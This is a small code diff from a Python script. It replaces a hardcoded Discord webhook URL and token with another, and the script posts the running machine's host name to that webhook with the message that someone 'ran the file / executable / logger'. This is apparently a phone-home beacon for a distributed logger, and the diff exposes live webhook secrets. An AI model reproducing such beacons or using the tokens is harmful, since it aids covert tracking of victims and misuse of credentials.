@@ -15,7 +15,7 @@ def send_message_to_webhook(webhook_url, message):
         print(f'ok')
 
 if __name__ == "__main__":
-    webhook_url = 'https://discord.com/api/webhooks/12061355289803147552/UJKnPkCb6ZDYVL1iRFgAEN8bVVpJHI16QLJUDUCHuuebk4E5F0kJoy_TK65pMAD_7SMj1'
+    webhook_url = 'https://discord.com/api/webhooks/1411685816542953472/-m-eMepo4_cFw38gqeUGx3A6R204ZK7QCANjY2paCitgi19L5NSM52KRWZMypA0NaI9T'
     message_to_send = f'{hostname} ran the file / executable / logger.'
 
     send_message_to_webhook(webhook_url, message_to_send)
